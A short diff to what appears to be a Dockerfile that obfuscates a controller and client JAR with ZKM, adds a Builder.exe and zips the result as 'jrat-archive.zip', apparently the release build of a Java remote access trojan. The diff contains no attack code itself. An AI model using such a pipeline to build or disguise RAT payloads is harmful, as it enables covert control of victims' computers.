@@ -17,9 +17,12 @@ COPY controller/files/client.jar .
 RUN java -jar zkm/ZKM.jar zkm-controller.txt
 RUN java -jar zkm/ZKM.jar zkm-client.txt
 
-RUN mkdir out/modules
+RUN mkdir out/modules out/files
+RUN mv out/client.jar out/files/client.jar
 RUN mv out/*-controller.jar out/*-client.jar out/modules
 
 COPY controller/files/db.dat controller/files/Builder.exe out/files/
 RUN mkdir /deploy
-RUN cd out && zip /deploy/jrat-archive.zip *
+
+WORKDIR out
+CMD zip -r /deploy/jrat-archive.zip *
